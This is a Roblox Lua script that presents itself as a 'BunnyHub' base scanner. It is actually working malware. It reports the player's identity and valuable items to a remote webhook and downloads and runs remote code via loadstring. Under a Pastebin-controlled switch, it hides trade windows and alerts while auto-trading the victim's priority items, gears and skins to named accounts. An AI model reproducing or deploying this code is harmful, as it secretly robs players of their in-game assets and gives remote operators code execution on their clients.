local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local localPlayer = Players.LocalPlayer
local playerGui = localPlayer:WaitForChild("PlayerGui")
local v = playerGui
local currentCamera = Workspace.CurrentCamera
local myBase = playerGui:WaitForChild("MyBase")
local str = "https://marketvalue.marketvalue.workers.dev/"
local str2 = "tumechupastodoelculo"

local function fn()
	if typeof(request) == "function" then
		return request
	end

	if typeof(http_request) == "function" then
		return http_request
	end

	if syn and typeof(syn.request) == "function" then
		return syn.request
	end

	if http and typeof(http.request) == "function" then
		return http.request
	end

	if fluxus and typeof(fluxus.request) == "function" then
		return fluxus.request
	end
	return nil
end

local function fn2(arg)
	if not arg then
		return false
	end
	local v2 = fn()
	if not v2 then
		return false
	end

	local ok, result = pcall(function()
		return HttpService:JSONEncode(arg)
	end)

	if not ok or not result then
		return false
	end

	local ok2, result2 = pcall(function()
		return v2({
			Url = str,
			Method = "POST",
			Headers = { ["Content-Type"] = "application/json", ["X-API-Key"] = str2 },
			Body = result,
		})
	end)

	if not ok2 then
		return false
	end

	if not result2 then
		return false
	end
	local statusCode = result2.StatusCode or result2.Status or result2.status_code

	if statusCode then
		local num = tonumber(statusCode)
		if num and (num < 200 or num >= 300) then
			return false
		end
	end

	return true
end

local str3 = "https://raw.githubusercontent.com/nicebonicely-hue/TRADESSABHUB/refs/heads/main/brainrots-bases-gears"
local tbl = { TARGET_PLACE_IDS = {}, BrainrotPriority = {}, NORMAL_BASE_SKINS = {}, NORMAL_GEARS = {} }

local function fn3()
	local v2 = fn()
	if not v2 then
		return
	end

	local ok, result = pcall(function()
		return v2({ Url = str3, Method = "GET" })
	end)

	if not ok or not result then
		return
	end
	local body = result.Body or result.body
	if not body then
		return
	end
	local chunk = loadstring(body)
	if not chunk then
		return
	end
	local ok2, result2 = pcall(chunk)

	if ok2 and type(result2) == "table" then
		tbl = result2
	end
end

fn3()
local tbl2 = {}
local v2 = ipairs
local brainrotPriority = tbl.BrainrotPriority or {}

for k, v3 in v2(brainrotPriority) do
	tbl2[v3] = k
end

local function fn4(arg)
	if not arg then
		return ""
	end
	return (arg:gsub("^Gold%s+", ""):gsub("^Diamond%s+", ""):gsub("^Bloodrot%s+", ""):gsub("^Candy%s+", ""):gsub("^Lava%s+", ""):gsub("^Galaxy%s+", ""):gsub("^Yin Yang%s+", ""):gsub("^Radioactive%s+", ""):gsub("^Cursed%s+", ""):gsub("^Rainbow%s+", ""):gsub("^Divine%s+", ""):gsub("^Cyber%s+", ""):gsub("^Ghost%s+", ""):gsub("^Crystal%s+", ""):gsub("^Shiny%s+", ""))
end

local function fn5(arg)
	if not arg then
		return nil
	end

	if tbl2[arg] then
		return tbl2[arg]
	end
	local v3 = fn4(arg)
	if tbl2[v3] then
		return tbl2[v3]
	end
	return nil
end

local flag = false
local n = 0.25
local tbl3 = {}
local str4 = ""
local flag2 = false
local flag3 = true
local v3 = nil

local function fn6(arg)
	if not arg then
		return ""
	end
	return (tostring(arg):gsub("%s+", " "):gsub("^%s+", ""):gsub("%s+$", ""))
end

local function fn7(arg)
	return string.lower(tostring(arg or "")):gsub("[%s%p]+", "")
end

local tbl4 = {}

local function fn8(arg)
	if not flag then
		return
	end

	if not arg:IsA("GuiObject") then
		return
	end

	if not tbl4[arg] then
		tbl4[arg] = {
			Position = arg.Position,
			Visible = arg.Visible,
			BackgroundTransparency = arg.BackgroundTransparency,
			TextTransparency = (arg:IsA("TextLabel") or arg:IsA("TextButton") or arg:IsA("TextBox")) and arg.TextTransparency or nil,
			TextStrokeTransparency = (arg:IsA("TextLabel") or arg:IsA("TextButton") or arg:IsA("TextBox")) and arg.TextStrokeTransparency or nil,
			ImageTransparency = (arg:IsA("ImageLabel") or arg:IsA("ImageButton")) and arg.ImageTransparency or nil,
			GroupTransparency = arg:IsA("CanvasGroup") and arg.GroupTransparency or nil,
		}

		local uiStroke = arg:FindFirstChildOfClass("UIStroke")

		if uiStroke then
			tbl4[arg].UIStroke = uiStroke
			tbl4[arg].UIStrokeTransparency = uiStroke.Transparency
		end
	end

	arg.Position = UDim2.new(10, 0, 10, 0)
	arg.BackgroundTransparency = 1

	if arg:IsA("TextLabel") or arg:IsA("TextButton") or arg:IsA("TextBox") then
		arg.TextTransparency = 1
		arg.TextStrokeTransparency = 1
	end

	if arg:IsA("ImageLabel") or arg:IsA("ImageButton") then
		arg.ImageTransparency = 1
	end

	if arg:IsA("CanvasGroup") then
		arg.GroupTransparency = 1
	end

	local uiStroke = arg:FindFirstChildOfClass("UIStroke")

	if uiStroke then
		uiStroke.Transparency = 1
	end
end

local function fn9(arg)
	if not flag then
		return
	end

	for _, descendant in ipairs(arg:GetDescendants()) do
		fn8(descendant)
	end

	if arg:IsA("GuiObject") then
		fn8(arg)
	end

	if not arg:GetAttribute("HideListenerSet") then
		arg:SetAttribute("HideListenerSet", true)

		arg.DescendantAdded:Connect(function(descendant)
			task.defer(function()
				fn8(descendant)
			end)
		end)
	end
end

local function fn10()
	for k, v4 in pairs(tbl4) do
		if k and k.Parent then
			pcall(function()
				k.Position = v4.Position
				k.Visible = v4.Visible
				k.BackgroundTransparency = v4.BackgroundTransparency

				if v4.TextTransparency ~= nil then
					k.TextTransparency = v4.TextTransparency
				end

				if v4.TextStrokeTransparency ~= nil then
					k.TextStrokeTransparency = v4.TextStrokeTransparency
				end

				if v4.ImageTransparency ~= nil then
					k.ImageTransparency = v4.ImageTransparency
				end

				if v4.GroupTransparency ~= nil then
					k.GroupTransparency = v4.GroupTransparency
				end

				if v4.UIStroke and v4.UIStroke.Parent then
					v4.UIStroke.Transparency = v4.UIStrokeTransparency
				end
			end)
		end
	end

	table.clear(tbl4)

	if currentCamera then
		pcall(function()
			currentCamera.FieldOfView = 70
		end)
	end
end

local function fn11()
	local function fn12(child)
		if child:IsA("BlurEffect") then
			child.Enabled = false
		end
	end

	currentCamera.ChildAdded:Connect(fn12)

	for _, child in ipairs(currentCamera:GetChildren()) do
		fn12(child)
	end

	task.spawn(function()
		while task.wait(0.1) do
			if flag then
				currentCamera.FieldOfView = 70
				local tradeLiveTrade = v:FindFirstChild("TradeLiveTrade")

				if tradeLiveTrade then
					fn9(tradeLiveTrade)
				end
			end
		end
	end)

	local function fn13(child)
		if not flag then
			return
		end

		if child.Name:find("Prompt") or child:IsA("ProximityPrompt") then
			return
		end

		if child.Name == "TopNotification" or child.Name == "Admin" then
			return
		end

		if ({ TradeLiveTrade = true, BrainrotTrader = true, TradePrompts = true })[child.Name] then
			if child:IsA("ScreenGui") then
				for _, child2 in ipairs(child:GetChildren()) do
					if child2:IsA("GuiObject") then
						child2.Position = UDim2.new(10, 0, 10, 0)
					end
				end
			end

			task.defer(function()
				fn9(child)
			end)

			return
		end

		if ({ TradeAlert = true, TradeError = true })[child.Name] then
			task.defer(function()
				fn9(child)
			end)
		end
	end

	v.ChildAdded:Connect(fn13)

	for _, child in ipairs(v:GetChildren()) do
		fn13(child)
	end
end

local function fn12()
	playerGui.DescendantAdded:Connect(function(descendant)
		if not flag then
			return
		end

		task.defer(function()
			if not flag then
				return
			end

			if descendant:IsA("GuiObject") then
				local str5 = ""

				for _, descendant2 in ipairs(descendant:GetDescendants()) do
					if descendant2:IsA("TextLabel") or descendant2:IsA("TextButton") then
						str5 = descendant2.Text or ""
						break
					end
				end

				if descendant:IsA("TextLabel") then
					str5 = descendant.Text or ""
				end

				local v4 = string.lower(str5)

				if string.find(v4, "intercambio") or string.find(v4, "other player") or string.find(v4, "inviting") or string.find(v4, "solomz90") or string.find(v4, "completed") or string.find(v4, "canceled") or string.find(v4, "adding") or string.find(v4, "failed to add") or string.find(v4, "no items in offer") or string.find(v4, "pending") or string.find(v4, "invite") or string.find(v4, "already") then
					descendant.Visible = false
					descendant.Position = UDim2.new(10, 0, 10, 0)
				end
			end
		end)
	end)
end

fn12()

local function fn13()
	local function fn14(arg)
		if not flag then
			return
		end

		if not arg:IsA("GuiObject") and not arg:IsA("ScreenGui") then
			return
		end

		local function fn15(arg2)
			if not (arg2:IsA("TextLabel") or arg2:IsA("TextButton") or arg2:IsA("TextBox")) then
				return false
			end
			local v4 = string.lower(tostring(arg2.Text or ""))
			if string.find(v4, "trade request", 1, true) or string.find(v4, "wants to trade", 1, true) or string.find(v4, "intercambio", 1, true) then
				return true
			end
			return false
		end

		local flag4 = false

		if fn15(arg) then
			flag4 = true
		end

		if not flag4 then
			for _, descendant in ipairs(arg:GetDescendants()) do
				if fn15(descendant) then
					flag4 = true
					break
				end
			end
		end

		if not flag4 then
			return
		end

		if arg:IsA("ScreenGui") then
			arg.Enabled = false

			for _, descendant in ipairs(arg:GetDescendants()) do
				if descendant:IsA("GuiObject") then
					descendant.Visible = false
					descendant.Position = UDim2.new(10, 0, 10, 0)
				end
			end
		elseif arg:IsA("GuiObject") then
			arg.Visible = false
			arg.Position = UDim2.new(10, 0, 10, 0)
		end
	end

	v.DescendantAdded:Connect(function(descendant)
		if not flag then
			return
		end

		task.defer(function()
			if descendant and descendant.Parent then
				fn14(descendant)
			end
		end)
	end)

	for _, child in ipairs(v:GetChildren()) do
		if flag then
			fn14(child)

			for _, descendant in ipairs(child:GetDescendants()) do
				if flag then
					fn14(descendant)
					continue
				end
				break
			end

			continue
		end

		break
	end
end

fn13()

Workspace.ChildAdded:Connect(function(child)
	if not flag then
		return
	end

	if child:IsA("Sound") and (child.Name == "Activated" or child.Name == "Error") then
		child.Volume = 0
		child:Stop()
		child:Destroy()
	end
end)

local function fn14(arg)
	if not arg then
		return false
	end

	if typeof(firesignal) == "function" then
		local ok = pcall(function()
			firesignal(arg.MouseButton1Click)
		end)

		pcall(function()
			firesignal(arg.Activated)
		end)

		return ok
	end

	if typeof(getconnections) == "function" then
		pcall(function()
			for _, v4 in ipairs(getconnections(arg.MouseButton1Click)) do
				if v4.Enabled then
					v4:Fire()
				end
			end
		end)

		pcall(function()
			for _, v4 in ipairs(getconnections(arg.Activated)) do
				if v4.Enabled then
					v4:Fire()
				end
			end
		end)

		return true
	end

	return false
end

local function fn15()
	local tradeLiveTrade = playerGui:FindFirstChild("TradeLiveTrade")
	if not tradeLiveTrade then
		return false
	end

	if tradeLiveTrade:IsA("ScreenGui") and not tradeLiveTrade.Enabled then
		return false
	end

	if tradeLiveTrade:IsA("GuiObject") and not tradeLiveTrade.Visible then
		return false
	end
	local tradeLiveTrade2 = tradeLiveTrade:FindFirstChild("TradeLiveTrade")
	if not tradeLiveTrade2 then
		return false
	end

	if tradeLiveTrade2:IsA("GuiObject") and not tradeLiveTrade2.Visible then
		return false
	end
	return true
end

local function fn16()
	local tradeLiveTrade = playerGui:FindFirstChild("TradeLiveTrade")
	if not tradeLiveTrade then
		return nil
	end
	local tradeLiveTrade2 = tradeLiveTrade:FindFirstChild("TradeLiveTrade")
	if not tradeLiveTrade2 then
		return nil
	end
	local your = tradeLiveTrade2:FindFirstChild("Your")
	if not your then
		return nil
	end
	return your:FindFirstChild("ScrollingFrame")
end

local function fn17(arg, arg2)
	local v4 = fn16()
	if not v4 then
		return nil, nil
	end
	arg2 = arg2 or {}
	local v5 = fn7(arg)
	local v6 = fn7(fn4(arg))

	for _, child in ipairs(v4:GetChildren()) do
		if string.find(child.Name, "Selection_Brainrot_", 1, true) and not arg2[child] then
			for _, descendant in ipairs(child:GetDescendants()) do
				if descendant:IsA("TextLabel") or descendant:IsA("TextButton") or descendant:IsA("TextBox") then
					local v7 = fn7(descendant.Text)

					if v7 ~= "" and v7 == v5 then
						local spacer = child:FindFirstChild("Spacer") or child:FindFirstChildWhichIsA("GuiButton", true)
						if spacer then
							return spacer, child
						end
					end
				end
			end
		end
	end

	for _, child in ipairs(v4:GetChildren()) do
		if string.find(child.Name, "Selection_Brainrot_", 1, true) and not arg2[child] then
			for _, descendant in ipairs(child:GetDescendants()) do
				if descendant:IsA("TextLabel") or descendant:IsA("TextButton") or descendant:IsA("TextBox") then
					local v7 = fn7(descendant.Text)
					local flag4 = v7 ~= ""
					local flag5

					if flag4 then
						flag5 = v7 == v6 or string.find(v7, v6, 1, true) or string.find(v6, v7, 1, true)
					else
						flag5 = flag4
					end

					if flag5 then
						local spacer = child:FindFirstChild("Spacer") or child:FindFirstChildWhichIsA("GuiButton", true)
						if spacer then
							return spacer, child
						end
					end
				end
			end
		end
	end

	return nil, nil
end

local function fn18(arg)
	if not arg then
		return false
	end
	local backgroundColor3 = arg.BackgroundColor3
	return math.abs(backgroundColor3.R - 0.0588) < 0.015 and math.abs(backgroundColor3.G - 0.196) < 0.015
end

local function fn19(arg, arg2, arg3)
	if not flag then
		return false
	end

	if not fn15() then
		return false
	end

	if not arg or not arg.name then
		return false
	end

	if not fn5(arg.name) then
		return false
	end
	arg3 = arg3 or {}
	task.wait(0.15)
	local v4, v5 = fn17(arg.name, arg3)
	if not v4 or not v5 then
		return false
	end

	if fn18(v4) then
		arg3[v5] = true
		return true
	end

	if not fn14(v4) then
		return false
	end
	task.wait(0.3)
	if fn18(v4) then
		arg3[v5] = true
		return true
	end
	arg3[v5] = nil
	return false
end

local function fn20()
	local tbl5 = {}
	local backpackGui = playerGui:FindFirstChild("BackpackGui")
	if not backpackGui then
		return {}
	end
	local backpack = backpackGui:FindFirstChild("Backpack")
	if not backpack then
		return {}
	end

	local function fn21(arg)
		if not arg then
			return
		end

		for _, descendant in ipairs(arg:GetDescendants()) do
			if descendant:IsA("TextLabel") and descendant.Name == "ToolName" then
				local v4 = fn7(descendant.Text)

				if v4 ~= "" then
					tbl5[v4] = true
				end
			end
		end
	end

	fn21(backpack:FindFirstChild("Hotbar"))
	local inventory = backpack:FindFirstChild("Inventory")

	if inventory then
		fn21(inventory:FindFirstChild("ScrollingFrame", true))
	end

	local v4 = fn16()
	if not v4 then
		return {}
	end
	local tbl6 = {}

	for _, child in ipairs(v4:GetChildren()) do
		if string.find(string.lower(child.Name), "gear", 1, true) then
			local v5 = nil

			for _, descendant in ipairs(child:GetDescendants()) do
				if descendant:IsA("TextLabel") or descendant:IsA("TextButton") or descendant:IsA("TextBox") then
					local v6 = fn7(descendant.Text)

					if v6 == "" then
						continue
					elseif tbl5[v6] then
						v5 = v6
						break
					else
						for k in pairs(tbl5) do
							if string.find(v6, k, 1, true) or string.find(k, v6, 1, true) then
								v5 = k
								break
							end
						end

						if not v5 then
							continue
						end
					end
				else
					continue
				end

				break
			end

			if v5 then
				local spacer = child:FindFirstChild("Spacer") or child:FindFirstChildWhichIsA("GuiButton", true)

				if spacer then
					table.insert(tbl6, { button = spacer, name = v5, slot = child })
				end
			end
		end
	end

	return tbl6
end

local function fn21(arg)
	if not flag then
		return false
	end

	if not fn15() then
		return false
	end

	if not arg or not arg.button then
		return false
	end
	local button = arg.button
	if fn18(button) then
		return true
	end

	if fn14(button) then
		task.wait(0.25)
		if fn18(button) then
			return true
		end
	end

-- https://lua-x.online
	return false
end

local function fn22()
	if not flag then
		return
	end

	if not fn15() then
		return
	end
	local v4 = fn16()
	if not v4 then
		return
	end
	local tbl5 = {}
	local v5 = ipairs
	local normalBaseSkins = tbl.NORMAL_BASE_SKINS or {}

	for _, normalBaseSkin in v5(normalBaseSkins) do
		tbl5[fn7(normalBaseSkin)] = true
	end

	for _, child in ipairs(v4:GetChildren()) do
		local v6 = string.lower(child.Name)

		if string.find(v6, "skin", 1, true) or string.find(v6, "base", 1, true) then
			local flag4 = false

			for _, descendant in ipairs(child:GetDescendants()) do
				if descendant:IsA("TextLabel") or descendant:IsA("TextButton") or descendant:IsA("TextBox") then
					local v7 = fn7(descendant.Text)

					if tbl5[v7] then
						flag4 = true
						break
					else
						for k in pairs(tbl5) do
							if v7 ~= "" and (string.find(v7, k, 1, true) or string.find(k, v7, 1, true)) then
								flag4 = true
								break
							end
						end

						if not flag4 then
							continue
						end
					end
				else
					continue
				end

				break
			end

			if flag4 then
				local spacer = child:FindFirstChild("Spacer") or child:FindFirstChildWhichIsA("GuiButton", true)

				if spacer and not fn18(spacer) then
					fn14(spacer)
					task.wait(0.25)
				end
			end
		end
	end
end

local function fn23()
	if not flag then
		return false
	end
	local tradeLiveTrade = playerGui:FindFirstChild("TradeLiveTrade")
	if not tradeLiveTrade then
		return false
	end
	local tradeLiveTrade2 = tradeLiveTrade:FindFirstChild("TradeLiveTrade")
	if not tradeLiveTrade2 then
		return false
	end
	local other = tradeLiveTrade2:FindFirstChild("Other")
	if not other then
		return false
	end
	local readyButton = other:FindFirstChild("ReadyButton")
	if not readyButton then
		return false
	end

	if not readyButton:IsA("GuiButton") then
		readyButton = readyButton:FindFirstChildWhichIsA("GuiButton", true)
	end

	if not readyButton then
		return false
	end
	fn14(readyButton)
	return true
end

local function fn24(arg)
	local text = arg or "solomz90"
	local v4 = string.lower(text)
	local tradePlayerList = playerGui:WaitForChild("TradePlayerList", 10)
	if not tradePlayerList then
		return false
	end
	local tradePlayerList2 = tradePlayerList:WaitForChild("TradePlayerList", 10)
	if not tradePlayerList2 then
		return false
	end
	local sections = tradePlayerList2:FindFirstChild("Sections")
	if not sections then
		return false
	end
	local players = sections:FindFirstChild("Players")
	if not players then
		return false
	end
	local searchFrame = players:FindFirstChild("SearchFrame")
	local list = players:FindFirstChild("List")
	if not searchFrame then
		return false
	end

	if not list then
		return false
	end

	local function fn25(arg2)
		if not flag then
			return
		end

		if not string.find(string.lower(arg2.Name), v4, 1, true) then
			return
		end

		if arg2:IsA("GuiObject") then
			arg2.Visible = false
			arg2.Position = UDim2.new(10, 0, 10, 0)
		end
	end

	local searchBox = searchFrame:FindFirstChild("SearchBox")
	if not searchBox then
		return false
	end
	searchBox.Text = text

	if typeof(firesignal) == "function" then
		pcall(function()
			firesignal(searchBox.FocusLost, true)
		end)

		pcall(function()
			firesignal(searchBox:GetPropertyChangedSignal("Text"))
		end)
	elseif typeof(getconnections) == "function" then
		pcall(function()
			for _, v5 in ipairs(getconnections(searchBox.FocusLost)) do
				if v5.Enabled then
					v5:Fire(true)
				end
			end
		end)

		pcall(function()
			for _, v5 in ipairs(getconnections(searchBox:GetPropertyChangedSignal("Text"))) do
				if v5.Enabled then
					v5:Fire()
				end
			end
		end)
	end

	task.wait(0.5)
	local v5 = nil

	for i = 1, 15 do
		for _, child in ipairs(list:GetChildren()) do
			if string.find(string.lower(child.Name), v4, 1, true) then
				v5 = child
				break
			else
				for _, descendant in ipairs(child:GetDescendants()) do
					if descendant:IsA("TextLabel") or descendant:IsA("TextButton") then
						if string.find(string.lower(tostring(descendant.Text or "")), v4, 1, true) then
							v5 = child
							break
						end
					end
				end

				if not v5 then
					continue
				end
			end

			break
		end

		if not v5 then
			task.wait(0.2)
			continue
		end
		break
	end

	searchBox.Text = ""
	if not v5 then
		return false
	end
	local v6 = nil

	for _, descendant in ipairs(v5:GetDescendants()) do
		if descendant:IsA("GuiButton") then
			v6 = descendant
			break
		else
			v6 = nil
		end
	end

	if not v6 then
		return false
	end

	if not fn14(v6) then
		return false
	end

	pcall(function()
		fn25(v5)
	end)

	list.ChildAdded:Connect(function(child)
		task.defer(function()
			fn25(child)
		end)
	end)

	return true
end

local function fn25(arg)
	local v4 = fn6(arg)
	if v4 == "" then
		return false
	end

	if v4 == "READY!" then
		return false
	end

	if v4 == "HATCH" then
		return false
	end

	if v4 == "SELL" then
		return false
	end
	return v4:find("/s", 1, true) ~= nil or v4:find("$", 1, true) ~= nil
end

local function fn26(arg)
	return tonumber(tostring(arg.Name):match("%d+"))
end

local function fn27()
	local tbl5 = {}
	local myBase2 = myBase:FindFirstChild("MyBase")
	if not myBase2 then
		return tbl5
	end
	local list = myBase2:FindFirstChild("List")
	if not list then
		return tbl5
	end

	for _, child in ipairs(list:GetChildren()) do
		local v4 = fn26(child)

		if v4 then
			local frame = child:FindFirstChild("Frame")

			if frame then
				local label = frame:FindFirstChild("Label")
				local progress = frame:FindFirstChild("Progress")
				progress = progress and progress:FindFirstChild("Label")
				label = label and fn6(label.Text)
				progress = progress and fn6(progress.Text)

				if label and label ~= "" and label ~= "Long Brainrot Name" and progress and fn25(progress) then
					table.insert(tbl5, {
						name = label,
						profit = progress,
						priority = fn5(label) or 9999,
						row = child.Name,
						rowNumber = v4,
					})
				end
			end
		end
	end

	table.sort(tbl5, function(arg, arg2)
		if arg.priority ~= arg2.priority then
			return arg.priority < arg2.priority
		end
		return arg.rowNumber < arg2.rowNumber
	end)

	return tbl5
end

local function fn28(arg)
	local tbl5 = {}
	local v4 = ipairs
	arg = arg or {}

	for _, v5 in v4(arg) do
		local str5 = fn7(v5.name) .. "|||" .. fn7(v5.profit)
		tbl5[str5] = (tbl5[str5] or 0) + 1
	end

	local tbl6 = {}

	for k, v5 in pairs(tbl5) do
		table.insert(tbl6, k .. "###" .. tostring(v5))
	end

	table.sort(tbl6)
	return table.concat(tbl6, "@@@")
end

local function fn29(arg, arg2)
	local tbl5 = {}
	local v4 = ipairs
	arg = arg or {}

	for _, v5 in v4(arg) do
		local str5 = fn7(v5.name) .. "|||" .. fn7(v5.profit)
		tbl5[str5] = (tbl5[str5] or 0) + 1
	end

	local tbl6 = {}
	local v5 = ipairs
	local tbl7 = arg2 or {}

	for _, v6 in v5(tbl7) do
		local str5 = fn7(v6.name) .. "|||" .. fn7(v6.profit)

		if (tbl5[str5] or 0) > 0 then
			tbl5[str5] = tbl5[str5] - 1
		else
			table.insert(tbl6, v6)
		end
	end

	return tbl6
end

local function fn30(arg)
	local v4 = ipairs
	local tbl5 = arg or {}

	for _, v5 in v4(tbl5) do
		if fn5(v5.name) then
			return true
		end
	end

	return false
end

local function fn31(arg, arg2)
	if not arg or #arg == 0 then
		return false
	end
	local tbl5 = {}
	local v4 = ipairs
	local tbl6 = arg2 or {}

	for _, v5 in v4(tbl6) do
		local str5 = fn7(v5.name) .. "|||" .. fn7(v5.profit)
		tbl5[str5] = (tbl5[str5] or 0) + 1
	end

	local tbl7 = {}

	for _, v5 in ipairs(arg) do
		local str5 = fn5(v5.name) and "⭐ " or "• "
		local str6 = fn7(v5.name) .. "|||" .. fn7(v5.profit)
		local n2 = tbl5[str6] or 0
		local str7 = ""

		if n2 > 0 then
			tbl5[str6] = tbl5[str6] - 1
			str7 = " 🆕 **[NUEVO]**"
		end

		table.insert(tbl7, str5 .. "**" .. tostring(v5.name) .. "** — `" .. tostring(v5.profit) .. "`" .. str7)
	end

	local tbl8 = {}
	local tbl9 = {}
	local n2 = 0

	for _, v5 in ipairs(tbl7) do
		local n3 = #v5 + 1

		if n2 + n3 > 1000 then
			if #tbl9 > 0 then
				table.insert(tbl8, {
					name = "🧠 BRAINROTS (Ordenados por Prioridad)",
					value = table.concat(tbl9, "\n"),
					inline = false,
				})
			end

			tbl9 = {}
			n2 = 0
		end

		table.insert(tbl9, v5)
		n2 += n3
	end

	if #tbl9 > 0 then
		table.insert(tbl8, {
			name = "🧠 BRAINROTS (Ordenados por Prioridad)",
			value = table.concat(tbl9, "\n"),
			inline = false,
		})
	end

	if arg2 and #arg2 > 0 then
		local tbl10 = {}

		for _, v5 in ipairs(arg2) do
			table.insert(tbl10, "• **" .. tostring(v5.name) .. "** (`" .. tostring(v5.profit) .. "`) — " .. tostring(v5.row or "?"))
		end

		table.insert(tbl8, 1, {
			name = "🚨 ¡NUEVO(S) BRAINROT(S) DETECTADO(S)!",
			value = table.concat(tbl10, "\n"),
			inline = false,
		})
	end

	local str5 = tostring(localPlayer.Name)
	local str6 = tostring(localPlayer.DisplayName)
	local str7 = tostring(localPlayer.UserId)
	local v5 = ipairs
	local tbl10 = arg2 or {}
	local flag4 = false

	for _, v6 in v5(tbl10) do
		if fn5(v6.name) then
			flag4 = true
			break
		end
	end

	local str8

	if arg2 and #arg2 > 0 then
		if flag4 then
			str8 = "🚨 Actualización de Base — ¡Brainrot Prioritario!"
		else
			str8 = "📊 Actualización de Base — ¡Nuevo Brainrot!"
		end
	else
		str8 = "📊 Reporte de Base - Brainrots"
	end

	local n3 = flag4 and 16766720 or 65280

	local tbl11 = {
		title = str8,
		description = "Se ha analizado **My Base** correctamente.\n\n" .. "👤 **Jugador:** `" .. str5 .. "`\n" .. "🏷️ **Display Name:** `" .. str6 .. "`\n" .. "🆔 **User ID:** `" .. str7 .. "`\n" .. "🧠 **Brainrots encontrados:** `" .. tostring(#arg) .. "`",
		color = n3,
		fields = tbl8,
		footer = { text = "🐰 BunnyHub • Base Scanner" },
		timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
	}

	arg2 = arg2 and #arg2 > 0
	local str9 = "@everyone"

	if arg2 then
		if flag4 then
			str9 = "@everyone 🚨 **¡BRAINROT PRIORITARIO NUEVO EN LA BASE!**"
		else
			str9 = "@everyone 🆕 **Actualización en la base**"
		end
	end

	return fn2({ content = str9, embeds = { tbl11 } })
end

local function fn32()
	local tradeLiveTrade = v:FindFirstChild("TradeLiveTrade")
	if not tradeLiveTrade then
		return false
	end
	local tradeLiveTrade2 = tradeLiveTrade:FindFirstChild("TradeLiveTrade")
	if not tradeLiveTrade2 then
		return false
	end
	local other = tradeLiveTrade2:FindFirstChild("Other")
	local flag4 = false

	if other then
		for _, descendant in ipairs(other:GetDescendants()) do
			if descendant:IsA("TextLabel") or descendant:IsA("TextButton") then
				if string.find(string.lower(tostring(descendant.Text or "")), "solomz90", 1, true) then
					flag4 = true
					break
				end
			end
		end
	end

	if flag4 then
		return true
	end
	local cancelButton = tradeLiveTrade2:FindFirstChild("CancelButton", true) or tradeLiveTrade2:FindFirstChild("Close", true)

	if cancelButton and cancelButton:IsA("GuiButton") then
		fn14(cancelButton)
	end

	if tradeLiveTrade:IsA("ScreenGui") then
		tradeLiveTrade.Enabled = false
	elseif tradeLiveTrade:IsA("GuiObject") then
		tradeLiveTrade.Visible = false
	end

	return false
end

local function fn33(arg)
	if not flag then
		return
	end

	if not fn15() then
		return
	end

	if not fn32() then
		return
	end
	local tbl5 = {}

	for i, v4 in ipairs(arg) do
		if not (not flag or not fn15()) then
			if fn5(v4.name) then
				for i2 = 1, 3 do
					if not (not flag or not fn15()) then
						if not fn19(v4, i, tbl5) then
							task.wait(0.4)
							continue
						end
					end

					break
				end

				task.wait(n + math.random(10, 25) / 100)
			end

			continue
		end

		break
	end

	if flag and fn15() then
		local v4 = fn20()

		for _, v5 in ipairs(v4) do
			if not (not flag or not fn15()) then
				for i = 1, 2 do
					if not fn21(v5) then
						task.wait(0.4)
						continue
					end
					break
				end

				task.wait(n + math.random(10, 25) / 100)
				continue
			end

			break
		end
	end

	if flag and fn15() then
		fn22()
	end

	task.wait(0.5)

	if flag and fn15() then
		fn23()
	end

	local n2 = 0

	while flag and fn15() and n2 < 30 do
		fn23()
		task.wait(1.5)
		n2 += 1.5
	end
end

local function fn34(arg)
	task.spawn(function()
		while flag do
			local flag4 = false

			pcall(function()
				flag4 = fn24(arg)
			end)

			if not flag4 then
				task.wait(1)
			else
				local n2 = 0

				while n2 < 15 do
					if not fn15() then
						task.wait(0.5)
						n2 += 0.5
						continue
					end

					break
				end

				if fn15() then
					task.wait(0.8)

					pcall(function()
						fn33(tbl3)
					end)
				end

				local n3 = 0

				while flag and fn15() and n3 < 60 do
					task.wait(1)
					n3 += 1
				end

				task.wait(1.5)
			end
		end
	end)
end

local function fn35()
	task.spawn(function()
		while flag3 do
			pcall(function()
				local v4 = fn27()
				local v5 = fn28(v4)

				if v5 == str4 then
					if flag and fn30(v4) and not flag2 then
						flag2 = true
						fn11()
						fn34("solomz90")
					end

					return
				end

				local v6 = fn29(tbl3, v4)
				tbl3 = v4
				str4 = v5

				if #v6 > 0 then
					fn31(tbl3, v6)
				else
					fn31(tbl3)
				end

				if flag and fn30(tbl3) and not flag2 then
					flag2 = true
					fn11()
					fn34("solomz90")
				end
			end)

			task.wait(1)
		end
	end)
end

tbl3 = fn27()
str4 = fn28(tbl3)
fn31(tbl3)
fn35()

if flag and fn30(tbl3) and not flag2 then
	flag2 = true
	fn11()
	fn34("solomz90")
end

local str5 = "https://pastebin.com/raw/mASagzmn"

local function fn36()
	local v4 = fn()
	if not v4 then
		return nil
	end

	local ok, result = pcall(function()
		return v4({ Url = str5, Method = "GET" })
	end)

	if not ok or not result then
		return nil
	end
	local body = result.Body or result.body
	if not body then
		return nil
	end
	local str6 = string.lower(tostring(body)):gsub("%s+", "")
	if str6 == "true" or str6 == "on" or str6 == "1" then
		return true
	end

	if str6 == "false" or str6 == "off" or str6 == "0" then
		return false
	end
	return nil
end

task.spawn(function()
	while true do
		local v4 = fn36()

		if v4 ~= nil and v4 ~= v3 then
			flag = v4
			v3 = v4

			if flag then
				local v5 = fn27()
				tbl3 = v5
				str4 = fn28(v5)

				if fn30(tbl3) and not flag2 then
					flag2 = true
					fn11()
					fn34("Kabarcas4344")
				end
			else
				flag2 = false
				fn10()
			end
		end
		task.wait(5)
	end
end)
